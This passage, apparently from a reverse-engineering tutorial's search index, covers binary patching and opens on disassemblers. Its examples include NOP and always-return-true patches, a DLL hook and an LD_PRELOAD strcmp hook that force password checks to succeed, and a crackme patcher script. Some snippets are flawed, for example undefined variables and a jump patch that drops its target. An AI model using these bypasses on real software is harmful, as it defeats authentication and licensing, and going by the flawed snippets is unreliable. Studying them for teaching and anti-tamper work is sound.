Patches","text":"Patch Type Purpose Complexity Risk NOP Patch Disable functionality Low Low Jump Patch Redirect execution Medium Medium Code Cave Add new functionality High High Data Patch Modify constants/strings Low Low"},{"location":"reverse-engineering/dynamic/03-patching/#common-patching-scenarios","title":"Common Patching Scenarios","text":"<pre><code>// Original vulnerable code\nint check_password(char *input) {\n    if (strcmp(input, \"secret123\") == 0) {\n        return 1;  // Success\n    }\n    return 0;      // Failure\n}\n\n// What we want to achieve:\n// 1. Always return success\n// 2. Change the password\n// 3. Add logging functionality\n// 4. Bypass the check entirely\n</code></pre>"},{"location":"reverse-engineering/dynamic/03-patching/#manual-patching-with-hex-editors","title":"Manual Patching with Hex Editors","text":""},{"location":"reverse-engineering/dynamic/03-patching/#using-hexedit","title":"Using hexedit","text":"<pre><code># Install hexedit\nsudo apt install hexedit\n\n# Open binary for editing\nhexedit ./target_binary\n\n# Basic hexedit commands:\n# Ctrl+S: Save\n# Ctrl+X: Exit\n# F2: Save and exit\n# Tab: Switch between hex and ASCII\n</code></pre>"},{"location":"reverse-engineering/dynamic/03-patching/#finding-patch-locations","title":"Finding Patch Locations","text":"<pre><code># Find string locations\nstrings -t x target_binary | grep \"password\"\n\n# Find instruction patterns\nobjdump -d target_binary | grep -A5 -B5 \"cmp\\|test\\|jne\\|je\"\n\n# Find specific byte patterns\nhexdump -C target_binary | grep \"74 05\"  # je instruction\n</code></pre>"},{"location":"reverse-engineering/dynamic/03-patching/#simple-nop-patch-example","title":"Simple NOP Patch Example","text":"<pre><code># Original assembly\n0x401234: cmp    eax, 0x1\n0x401237: jne    0x401250    # Jump if not equal (74 19)\n0x401239: mov    eax, 0x1    # Success path\n\n# Patch: NOP out the conditional jump\n# Replace \"74 19\" with \"90 90\" (NOP NOP)\n</code></pre> <p>Hex editor steps: 1. Find address 0x401237 in hex editor 2. Locate bytes \"74 19\" 3. Replace with \"90 90\" 4. Save file</p>"},{"location":"reverse-engineering/dynamic/03-patching/#advanced-patching-techniques","title":"Advanced Patching Techniques","text":""},{"location":"reverse-engineering/dynamic/03-patching/#code-cave-patching","title":"Code Cave Patching","text":"<pre><code># Problem: Need more space than available\n# Solution: Create a code cave\n\n# Original code (limited space):\n0x401234: cmp    eax, 0x1     # 83 F8 01\n0x401237: jne    0x401250     # 75 17\n0x401239: mov    eax, 0x1     # B8 01 00 00 00\n\n# Step 1: Find unused space (code cave)\n# Look for areas of null bytes (00 00 00...)\n\n# Step 2: Write new functionality in cave\n# Address: 0x402000 (code cave)\n0x402000: push   rax          # Save registers\n0x402001: push   rbx\n0x402002: mov    rax, 1       # Our new logic\n0x402007: pop    rbx          # Restore registers  \n0x402008: pop    rax\n0x402009: jmp    0x401239     # Return to original flow\n\n# Step 3: Redirect original code to cave\n0x401234: jmp    0x402000     # E9 C7 0E 00 00\n0x401239: nop                 # 90 (fill remaining bytes)\n0x40123A: nop                 # 90\n</code></pre>"},{"location":"reverse-engineering/dynamic/03-patching/#function-hooking","title":"Function Hooking","text":"<pre><code>#!/usr/bin/env python3\n\ndef create_function_hook():\n    \"\"\"Create a function hook using binary patching\"\"\"\n\n    # Original function entry\n    original_entry = 0x401000\n\n    # Our hook function (in code cave)\n    hook_function = 0x402000\n\n    # Calculate jump offset\n    jump_offset = hook_function - (original_entry + 5)  # 5 bytes for jmp instruction\n\n    # Create jump instruction (E9 = jmp rel32)\n    jump_bytes = b'\\xE9' + jump_offset.to_bytes(4, 'little', signed=True)\n\n    print(f\"Patch bytes: {jump_bytes.hex()}\")\n\n    # Hook function assembly (at 0x402000)\n    hook_code = \"\"\"\n    push rax        ; Save registers\n    push rbx\n    push rcx\n\n    ; Our custom logic here\n    mov rax, 42     ; Example: always return 42\n\n    pop rcx         ; Restore registers\n    pop rbx\n    pop rax\n\n    ; Jump back to original function (after our patch)\n    jmp original_function + 5\n    \"\"\"\n\n    return jump_bytes, hook_code\n\ndef patch_binary_file(file_path, offset, new_bytes):\n    \"\"\"Apply patch to binary file\"\"\"\n    import shutil\n\n    # Create backup\n    shutil.copy(file_path, file_path + '.backup')\n\n    with open(file_path, 'r+b') as f:\n        f.seek(offset)\n        f.write(new_bytes)\n\n    print(f\"Patched {len(new_bytes)} bytes at offset 0x{offset:x}\")\n</code></pre>"},{"location":"reverse-engineering/dynamic/03-patching/#patching-tools-and-frameworks","title":"Patching Tools and Frameworks","text":""},{"location":"reverse-engineering/dynamic/03-patching/#using-radare2-for-patching","title":"Using radare2 for Patching","text":"<pre><code># Open binary in write mode\nr2 -w ./target_binary\n\n# Analyze binary\naaa\n\n# Seek to function\ns sym.check_password\n\n# View assembly\npdf\n\n# Patch instructions\nwa mov eax, 1      # Write assembly instruction\nwa nop             # Write NOP\nwa ret             # Write return\n\n# Patch bytes directly\nwx 909090          # Write hex bytes (3 NOPs)\n\n# Save changes\nq\n</code></pre>"},{"location":"reverse-engineering/dynamic/03-patching/#ida-pro-patching","title":"IDA Pro Patching","text":"<pre><code># IDAPython script for patching\nimport idaapi\nimport idc\n\ndef patch_instruction(addr, new_bytes):\n    \"\"\"Patch instruction at given address\"\"\"\n\n    # Convert hex string to bytes if needed\n    if isinstance(new_bytes, str):\n        new_bytes = bytes.fromhex(new_bytes)\n\n    # Apply patch\n    for i, byte in enumerate(new_bytes):\n        idc.patch_byte(addr + i, byte)\n\n    print(f\"Patched {len(new_bytes)} bytes at {hex(addr)}\")\n\ndef nop_function(func_addr):\n    \"\"\"NOP out entire function\"\"\"\n    func = idaapi.get_func(func_addr)\n    if not func:\n        print(\"Function not found\")\n        return\n\n    # NOP from start to end\n    addr = func.start_ea\n    while addr &lt; func.end_ea:\n        idc.patch_byte(addr, 0x90)  # NOP\n        addr += 1\n\n    print(f\"NOPed function at {hex(func_addr)}\")\n\ndef always_return_true(func_addr):\n    \"\"\"Patch function to always return 1\"\"\"\n\n    # mov eax, 1; ret (B8 01 00 00 00 C3)\n    patch_bytes = b'\\xB8\\x01\\x00\\x00\\x00\\xC3'\n\n    # Apply patch at function start\n    for i, byte in enumerate(patch_bytes):\n        idc.patch_byte(func_addr + i, byte)\n\n    print(f\"Function at {hex(func_addr)} will always return 1\")\n\n# Usage examples\npatch_instruction(0x401234, \"9090\")  # NOP out 2 bytes\nalways_return_true(0x401000)         # Make function return true\nnop_function(0x401500)               # Disable entire function\n</code></pre>"},{"location":"reverse-engineering/dynamic/03-patching/#ghidra-patching","title":"Ghidra Patching","text":"<pre><code>// Ghidra script for patching\nimport ghidra.app.script.GhidraScript;\nimport ghidra.program.model.address.*;\nimport ghidra.program.model.listing.*;\nimport ghidra.program.model.mem.*;\n\npublic class BinaryPatcher extends GhidraScript {\n\n    @Override\n    protected void run() throws Exception {\n        // Get current program\n        Program program = getCurrentProgram();\n        Memory memory = program.getMemory();\n\n        // Find address to patch\n        Address patchAddr = toAddr(0x401234);\n\n        // Create patch bytes\n        byte[] nopBytes = {(byte)0x90, (byte)0x90};\n\n        // Apply patch\n        memory.setBytes(patchAddr, nopBytes);\n\n        printf(\"Patched %d bytes at %s\\n\", nopBytes.length, patchAddr);\n    }\n\n    public void patchFunction(String functionName, byte[] patchBytes) throws Exception {\n        Function func = getFunction(functionName);\n        if (func == null) {\n            printf(\"Function %s not found\\n\", functionName);\n            return;\n        }\n\n        Address funcAddr = func.getEntryPoint();\n        getCurrentProgram().getMemory().setBytes(funcAddr, patchBytes);\n\n        printf(\"Patched function %s at %s\\n\", functionName, funcAddr);\n    }\n\n    public void createAlwaysTrue(String functionName) throws Exception {\n        // mov eax, 1; ret\n        byte[] alwaysTrue = {(byte)0xB8, 0x01, 0x00, 0x00, 0x00, (byte)0xC3};\n        patchFunction(functionName, alwaysTrue);\n    }\n}\n</code></pre>"},{"location":"reverse-engineering/dynamic/03-patching/#runtime-patching","title":"Runtime Patching","text":""},{"location":"reverse-engineering/dynamic/03-patching/#dll-injection","title":"DLL Injection","text":"<pre><code>// hook.cpp - DLL for runtime patching\n#include &lt;windows.h&gt;\n#include &lt;detours.h&gt;\n\n// Original function pointer\nstatic int (WINAPI* TrueCheckPassword)(char* input) = CheckPassword;\n\n// Our hook function\nint WINAPI HookedCheckPassword(char* input) {\n    // Log the attempt\n    OutputDebugStringA(\"Password check intercepted\");\n\n    // Always return success\n    return 1;\n}\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {\n    switch (dwReason) {\n    case DLL_PROCESS_ATTACH:\n        // Install hook\n        DetourTransactionBegin();\n        DetourUpdateThread(GetCurrentThread());\n        DetourAttach(&amp;(PVOID&amp;)TrueCheckPassword, HookedCheckPassword);\n        DetourTransactionCommit();\n        break;\n\n    case DLL_PROCESS_DETACH:\n        // Remove hook\n        DetourTransactionBegin();\n        DetourUpdateThread(GetCurrentThread());\n        DetourDetach(&amp;(PVOID&amp;)TrueCheckPassword, HookedCheckPassword);\n        DetourTransactionCommit();\n        break;\n    }\n    return TRUE;\n}\n</code></pre>"},{"location":"reverse-engineering/dynamic/03-patching/#linux-function-interposition","title":"Linux Function Interposition","text":"<pre><code>// hook.c - LD_PRELOAD library\n#define _GNU_SOURCE\n#include &lt;dlfcn.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n// Hook strcmp function\nint strcmp(const char *s1, const char *s2) {\n    // Get original function\n    static int (*original_strcmp)(const char*, const char*) = NULL;\n    if (!original_strcmp) {\n        original_strcmp = dlsym(RTLD_NEXT, \"strcmp\");\n    }\n\n    // Log the comparison\n    printf(\"strcmp called: '%s' vs '%s'\\n\", s1, s2);\n\n    // Check if it's a password comparison\n    if (strstr(s1, \"password\") || strstr(s2, \"password\")) {\n        printf(\"Password comparison detected - returning match\\n\");\n        return 0;  // Always match\n    }\n\n    // Call original function\n    return original_strcmp(s1, s2);\n}\n</code></pre> <p>Usage: <pre><code># Compile hook library\ngcc -shared -fPIC -o hook.so hook.c -ldl\n\n# Use with target program\nLD_PRELOAD=./hook.so ./target_program\n</code></pre></p>"},{"location":"reverse-engineering/dynamic/03-patching/#automated-patching","title":"Automated Patching","text":""},{"location":"reverse-engineering/dynamic/03-patching/#python-patching-framework","title":"Python Patching Framework","text":"<pre><code>#!/usr/bin/env python3\nimport struct\nimport shutil\nfrom typing import List, Tuple\n\nclass BinaryPatcher:\n    def __init__(self, binary_path: str):\n        self.binary_path = binary_path\n        self.backup_path = binary_path + '.backup'\n        self.patches: List[Tuple[int, bytes]] = []\n\n        # Create backup\n        shutil.copy(binary_path, self.backup_path)\n\n        with open(binary_path, 'rb') as f:\n            self.binary_data = bytearray(f.read())\n\n    def add_patch(self, offset: int, data: bytes):\n        \"\"\"Add a patch to be applied\"\"\"\n        self.patches.append((offset, data))\n\n    def nop_bytes(self, offset: int, count: int):\n        \"\"\"NOP out specified number of bytes\"\"\"\n        nop_data = b'\\x90' * count\n        self.add_patch(offset, nop_data)\n\n    def patch_jump(self, from_addr: int, to_addr: int):\n        \"\"\"Patch a jump instruction\"\"\"\n        # Calculate relative offset\n        offset = to_addr - (from_addr + 5)  # 5 bytes for jmp instruction\n\n        # Create jump instruction (E9 = jmp rel32)\n        jump_bytes = b'\\xE9' + struct.pack('&lt;i', offset)\n        self.add_patch(from_addr, jump_bytes)\n\n    def patch_call(self, from_addr: int, to_addr: int):\n        \"\"\"Patch a call instruction\"\"\"\n        # Calculate relative offset\n        offset = to_addr - (from_addr + 5)  # 5 bytes for call instruction\n\n        # Create call instruction (E8 = call rel32)\n        call_bytes = b'\\xE8' + struct.pack('&lt;i', offset)\n        self.add_patch(from_addr, call_bytes)\n\n    def patch_string(self, offset: int, new_string: str):\n        \"\"\"Replace string at offset\"\"\"\n        string_bytes = new_string.encode('utf-8') + b'\\x00'\n        self.add_patch(offset, string_bytes)\n\n    def always_return_true(self, func_addr: int):\n        \"\"\"Make function always return 1\"\"\"\n        # mov eax, 1; ret\n        patch_bytes = b'\\xB8\\x01\\x00\\x00\\x00\\xC3'\n        self.add_patch(func_addr, patch_bytes)\n\n    def always_return_false(self, func_addr: int):\n        \"\"\"Make function always return 0\"\"\"\n        # xor eax, eax; ret\n        patch_bytes = b'\\x31\\xC0\\xC3'\n        self.add_patch(func_addr, patch_bytes)\n\n    def find_pattern(self, pattern: bytes) -&gt; List[int]:\n        \"\"\"Find all occurrences of a byte pattern\"\"\"\n        offsets = []\n        start = 0\n        while True:\n            pos = self.binary_data.find(pattern, start)\n            if pos == -1:\n                break\n            offsets.append(pos)\n            start = pos + 1\n        return offsets\n\n    def apply_patches(self):\n        \"\"\"Apply all queued patches\"\"\"\n        print(f\"Applying {len(self.patches)} patches...\")\n\n        for offset, data in self.patches:\n            if offset + len(data) &gt; len(self.binary_data):\n                print(f\"Warning: Patch at {hex(offset)} extends beyond file\")\n                continue\n\n            # Apply patch\n            self.binary_data[offset:offset+len(data)] = data\n            print(f\"Patched {len(data)} bytes at {hex(offset)}\")\n\n        # Write patched binary\n        with open(self.binary_path, 'wb') as f:\n            f.write(self.binary_data)\n\n        print(f\"Patching complete. Backup saved as {self.backup_path}\")\n\n    def restore_backup(self):\n        \"\"\"Restore original binary from backup\"\"\"\n        shutil.copy(self.backup_path, self.binary_path)\n        print(\"Binary restored from backup\")\n\n# Usage example\ndef patch_crackme():\n    patcher = BinaryPatcher('./crackme')\n\n    # Find password check function\n    password_check_addr = 0x401000\n\n    # Make it always return true\n    patcher.always_return_true(password_check_addr)\n\n    # Change password string\n    password_string_offset = 0x2000\n    patcher.patch_string(password_string_offset, \"newpassword\")\n\n    # Apply all patches\n    patcher.apply_patches()\n\nif __name__ == '__main__':\n    patch_crackme()\n</code></pre>"},{"location":"reverse-engineering/dynamic/03-patching/#signature-based-patching","title":"Signature-Based Patching","text":"<pre><code>#!/usr/bin/env python3\nimport re\n\nclass SignaturePatcher:\n    def __init__(self, binary_path: str):\n        self.binary_path = binary_path\n\n        with open(binary_path, 'rb') as f:\n            self.data = bytearray(f.read())\n\n    def find_signature(self, signature: str) -&gt; List[int]:\n        \"\"\"Find addresses matching byte signature with wildcards\"\"\"\n        # Convert signature to regex pattern\n        # Example: \"48 8B ?? 83 F8 01\" -&gt; rb'\\x48\\x8B..\\x83\\xF8\\x01'\n\n        pattern_bytes = []\n        for part in signature.split():\n            if part == '??':\n                pattern_bytes.append(b'.')\n            else:\n                pattern_bytes.append(bytes([int(part, 16)]))\n\n        pattern = b''.join(pattern_bytes)\n\n        # Find all matches\n        matches = []\n        for match in re.finditer(pattern, self.data, re.DOTALL):\n            matches.append(match.start())\n\n        return matches\n\n    def patch_signature(self, signature: str, replacement: bytes):\n        \"\"\"Patch all instances matching signature\"\"\"\n        matches = self.find_signature(signature)\n\n        for addr in matches:\n            # Verify signature length matches replacement\n            sig_len = len(signature.split())\n            if len(replacement) != sig_len:\n                print(f\"Warning: Replacement length mismatch at {hex(addr)}\")\n                continue\n\n            # Apply patch\n            self.data[addr:addr+len(replacement)] = replacement\n            print(f\"Patched signature at {hex(addr)}\")\n\n    def save(self, output_path: str = None):\n        \"\"\"Save patched binary\"\"\"\n        if output_path is None:\n            output_path = self.binary_path\n\n        with open(output_path, 'wb') as f:\n            f.write(self.data)\n\n# Example: Patch all conditional jumps to unconditional\ndef patch_conditional_jumps():\n    patcher = SignaturePatcher('./target')\n\n    # Find conditional jump patterns and replace with unconditional jumps\n    # je (74 ??) -&gt; jmp (EB ??)\n    patcher.patch_signature(\"74 ??\", b'\\xEB\\x00')  # Replace with jmp short\n\n    # jne (75 ??) -&gt; jmp (EB ??)  \n    patcher.patch_signature(\"75 ??\", b'\\xEB\\x00')\n\n    patcher.save('./target_patched')\n</code></pre>"},{"location":"reverse-engineering/dynamic/03-patching/#security-and-anti-tampering","title":"Security and Anti-Tampering","text":""},{"location":"reverse-engineering/dynamic/03-patching/#detecting-patches","title":"Detecting Patches","text":"<pre><code>#!/usr/bin/env python3\nimport hashlib\n\ndef detect_modifications(original_file: str, suspected_file: str):\n    \"\"\"Detect if binary has been modified\"\"\"\n\n    def file_hash(filename: str) -&gt; str:\n        with open(filename, 'rb') as f:\n            return hashlib.sha256(f.read()).hexdigest()\n\n    original_hash = file_hash(original_file)\n    suspected_hash = file_hash(suspected_file)\n\n    if original_hash != suspected_hash:\n        print(\"Binary has been modified!\")\n        return True\n    else:\n        print(\"Binary appears unchanged\")\n        return False\n\ndef check_common_patches(binary_path: str):\n    \"\"\"Check for common patching signatures\"\"\"\n\n    with open(binary_path, 'rb') as f:\n        data = f.read()\n\n    # Check for excessive NOPs (possible patch)\n    nop_sequences = data.count(b'\\x90' * 10)  # 10+ consecutive NOPs\n    if nop_sequences &gt; 0:\n        print(f\"Found {nop_sequences} suspicious NOP sequences\")\n\n    # Check for unexpected jump instructions\n    long_jumps = data.count(b'\\xE9')  # JMP near\n    if long_jumps &gt; expected_jumps:\n        print(f\"Unusual number of jump instructions: {long_jumps}\")\n\n    # Check for code caves (null byte regions)\n    null_regions = re.findall(b'\\x00{50,}', data)  # 50+ null bytes\n    print(f\"Found {len(null_regions)} potential code caves\")\n</code></pre>"},{"location":"reverse-engineering/dynamic/03-patching/#anti-patching-techniques","title":"Anti-Patching Techniques","text":"<pre><code>// anti_patch.c - Self-integrity checking\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n// Calculate checksum of code section\nunsigned int calculate_checksum(void *start, size_t length) {\n    unsigned int checksum = 0;\n    unsigned char *bytes = (unsigned char*)start;\n\n    for (size_t i = 0; i &lt; length; i++) {\n        checksum += bytes[i];\n        checksum ^= (checksum &lt;&lt; 3);\n    }\n\n    return checksum;\n}\n\n// Anti-patching check\nvoid integrity_check() {\n    extern char __text_start, __text_end;\n    size_t text_size = &amp;__text_end - &amp;__text_start;\n\n    // Expected checksum (calculated at compile time)\n    const unsigned int expected_checksum = 0x12345678;\n\n    unsigned int current_checksum = calculate_checksum(&amp;__text_start, text_size);\n\n    if (current_checksum != expected_checksum) {\n        printf(\"Integrity check failed - binary may be patched\\n\");\n        exit(1);\n    }\n}\n\nint main() {\n    integrity_check();\n\n    // Rest of program...\n    printf(\"Integrity check passed\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"reverse-engineering/dynamic/03-patching/#best-practices","title":"Best Practices","text":""},{"location":"reverse-engineering/dynamic/03-patching/#patching-workflow","title":"Patching Workflow","text":"<ol> <li>Backup original binary - Always create backups before patching</li> <li>Test patches - Verify patches work as expected</li> <li>Document changes - Keep track of what was modified</li> <li>Minimal changes - Make smallest possible modifications</li> <li>Verify functionality - Ensure program still works correctly</li> </ol>"},{"location":"reverse-engineering/dynamic/03-patching/#safe-patching-guidelines","title":"Safe Patching Guidelines","text":"<pre><code>def safe_patching_checklist():\n    \"\"\"Checklist for safe binary patching\"\"\"\n\n    checklist = [\n        \"\u2713 Created backup of original binary\",\n        \"\u2713 Identified exact patch location\", \n        \"\u2713 Calculated correct instruction bytes\",\n        \"\u2713 Verified patch doesn't break alignment\",\n        \"\u2713 Tested patch in isolated environment\",\n        \"\u2713 Documented all changes made\",\n        \"\u2713 Have rollback plan ready\"\n    ]\n\n    for item in checklist:\n        print(item)\n\ndef patch_validation():\n    \"\"\"Validate patch before applying\"\"\"\n\n    # Check file permissions\n    if not os.access(binary_path, os.W_OK):\n        raise Exception(\"Binary is not writable\")\n\n    # Check if binary is currently running\n    if is_process_running(binary_path):\n        raise Exception(\"Cannot patch running binary\")\n\n    # Verify patch location is in executable section\n    if not is_executable_section(patch_address):\n        raise Exception(\"Patch location is not executable\")\n\n    # Check for sufficient space\n    if patch_size &gt; available_space:\n        raise Exception(\"Insufficient space for patch\")\n</code></pre>"},{"location":"reverse-engineering/dynamic/03-patching/#key-takeaways","title":"Key Takeaways","text":"<p>Binary Patching Fundamentals</p> <ul> <li>Always backup original binaries before patching</li> <li>Understand target architecture - x86 vs x64 instructions differ</li> <li>Use appropriate tools - Hex editors for simple patches, specialized tools for complex ones</li> <li>Test thoroughly - Verify patches work in all scenarios</li> <li>Consider alternatives - Runtime hooking may be better than permanent patches</li> </ul> <p>Patching Best Practices</p> <ul> <li>Start with simple NOP patches before attempting complex modifications</li> <li>Use automated tools to reduce human error</li> <li>Document all changes for future reference</li> <li>Test patches on copies, never on production binaries</li> <li>Understand the original code before modifying it</li> </ul> <p>Common Pitfalls</p> <ul> <li>Incorrectly calculating jump offsets</li> <li>Patching in non-executable sections</li> <li>Breaking instruction alignment</li> <li>Overwriting critical code sections</li> <li>Not accounting for anti-tamper mechanisms</li> </ul> <p>Next: Advanced Techniques - Symbolic Execution</p>"},{"location":"reverse-engineering/static/01-disassemblers/","title":"Disassemblers: IDA Pro and Ghidra","text":"<p>Disassemblers are essential tools for reverse engineering, converting machine code back into human-readable assembly language. This section covers the two most popular disassemblers: IDA Pro and Ghidra.</p>"},{"location":"reverse-engineering/static/01-disassemblers/#introduction-to-disassemblers","title":"Introduction to Disassemblers","text":""},{"location":"reverse-engineering/static/01-disassemblers/#what-disassemblers-do","title":"What Disassemblers Do","text":"<ul> <li>Convert machine code to assembly - Translate binary instructions to assembly</li> <li>Identify functions and data - Recognize code vs data sections</li> <li>Generate cross-references - Show relationships between code sections</li> <li>Provide analysis tools - Graphs, symbol tables, and annotations</li> <li>Support multiple architectures - x86, x64, ARM, MIPS, etc.</li> </ul>"},{"location":"reverse-engineering/static/01-disassemblers/#static-vs-dynamic-analysis","title":"Static vs Dynamic Analysis","text":"Static Analysis Dynamic Analysis Examines code without execution Analyzes running program Fast and safe Shows actual runtime behavior May miss runtime-dependent code Requires execution environment Good for overall understanding Good for specific execution paths"},{"location":"reverse-engineering/static/01-disassemblers/#ida-pro-overview","title":"IDA Pro Overview","text":""},{"location":"reverse-engineering/static/01-disassemblers/#ida-pro-features","title":"IDA Pro Features","text":"<ul> <li>Industry standard disassembler</li> <li>Advanced analysis - Data flow, control flow analysis</li> <li>Scripting support - IDAPython, IDC</li> <li>Plugin ecosystem - Extensive third-party plugins</li> <li>Collaborative features - Team analysis capabilities</li> <li>Multiple file formats - PE, ELF, Mach-O, raw binary</li> </ul>"},{"location":"reverse-engineering/static/01-disassemblers/#ida-pro-interface","title":"IDA Pro Interface","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 File  Edit  View  Search  Debugger  Options     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Functions \u2502              IDA View               \u2502\n\u2502 Window    \u2502                                     \u2502\n\u2502           \u2502  .text:00401000 push    ebp         \u2502\n\u2502 main      \u2502  .text:00401001 mov     ebp, esp    \u2502\n\u2502 sub_1010  \u2502  .text:00401003 sub     esp, 40h    \u2502\n\u2502 sub_1050  \u2502  .text:00401006 push    esi         \u2502\n\u2502           \u2502  .text:00401007 push    edi         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Output    \u2502           Hex View                  \u2502\n\u2502 Window    \u2502                                     \u2502\n\u2502           \u2502  00401000: 55 8B EC 83 EC 40 56 57 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"reverse-engineering/static/01-disassemblers/#basic-ida-pro-workflow","title":"Basic IDA Pro Workflow","text":"<ol> <li>Load binary - File \u2192 Open, select target file</li> <li>Auto-analysis - Let IDA analyze the binary automatically</li> <li>Navigate code - Use Functions window, cross-references</li> <li>Rename symbols - Give meaningful names to functions/variables</li> <li>Add comments - Document your findings</li> <li>Create structures - Define data structures</li> <li>Generate pseudocode - Use F5 for decompiler view</li> </ol>"},{"location":"reverse-engineering/static/01-disassemblers/#ghidra-overview","title":"Ghidra Overview","text":""},{"location":"reverse-engineering/static/01-disassemblers/#ghidra-features","title":"Ghidra Features","text":"<ul> <li>Free and open source - Developed by NSA</li> <li>Built-in decompiler - Generates C-like pseudocode</li> <li>Version tracking - Compare different versions of binaries</li> <li>Team collaboration - Shared projects and repositories</li> <li>Extensible architecture - Custom analyzers and plugins</li> <li>Cross-platform - Runs on Windows, Linux, macOS</li> </ul>"},{"location":"reverse-engineering/static/01-disassemblers/#ghidra-interface","title":"Ghidra Interface","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 File  Edit  Navigation  Search  Analysis  Tools \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Program \u2502              Listing                 \u2502\n\u2502 Tree    \u2502                                       \u2502\n\u2502         \u2502  00401000 PUSH       EBP              \u2502\n\u2502 main    \u2502  00401001 MOV        EBP,ESP          \u2502\n\u2502 FUN_... \u2502  00401003 SUB        ESP,0x40         \u2502\n\u2502 data    \u2502  00401006 PUSH       ESI              \u2502\n\u2502         \u2502  00401007 PUSH       EDI              \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Decmp.  \u2502           Data Type Manager           \u2502\n\u2502 main    \u2502                                       \u2502\n\u2502 {...}   \u2502  int main(void) {                     \u2502\n\u2502         \u2502    // Function implementation         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"reverse-engineering/static/01-disassemblers/#basic-ghidra-workflow","title":"Basic Ghidra Workflow","text":"<ol> <li>Create project - File \u2192 New Project</li> <li>Import binary - File \u2192 Import File</li> <li>Auto-analyze - Analyze \u2192 Auto Analyze</li> <li>Navigate code - Use Program Tree, Symbol Tree</li> <li>View decompiler - Window \u2192 Decompiler</li> <li>Create data types - Data Type Manager</li> <li>Add bookmarks - Mark important locations</li> </ol>"},{"location":"reverse-engineering/static/01-disassemblers/#practical-example-analyzing-a-simple-binary","title":"Practical Example: Analyzing a Simple Binary","text":""},{"location":"reverse-engineering/static/01-disassemblers/#sample-c-program","title":"Sample C Program","text":"<pre><code>// crackme.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint check_password(char *input) {\n    char secret[] = \"r3v3rs3\";\n    return strcmp(input, secret) == 0;\n}\n\nint main() {\n    char password[100];\n    printf(\"Enter password: \");\n    scanf(\"%99s\", password);\n\n    if (check_password(password)) {\n        printf(\"Access granted!\\n\");\n    } else {\n        printf(\"Access denied!\\n\");\n    }\n\n    return 0;\n}\n</code></pre> <p>Compilation: <pre><code># Compile without debug symbols\ngcc -O0 -o crackme crackme.c\n\n# Strip symbols\nstrip crackme\n</code></pre></p>"},{"location":"reverse-engineering/static/01-disassemblers/#ida-pro-analysis","title":"IDA Pro Analysis","text":""},{"location":"reverse-engineering/static/01-disassemblers/#loading-the-binary","title":"Loading the Binary","text":"<ol> <li> <p>Open in IDA Pro <pre><code>File \u2192 Open \u2192 Select crackme\nProcessor type: PC\nLoad debug symbols: No (stripped binary)\n</code></pre></p> </li> <li> <p>Initial Analysis <pre><code>IDA will automatically:\n- Identify entry point\n- Analyze code sections\n- Create functions\n- Generate cross-references\n</code></pre></p> </li> </ol>"},{"location":"reverse-engineering/static/01-disassemblers/#function-analysis","title":"Function Analysis","text":"<p>Entry Point (<code>start</code> function): 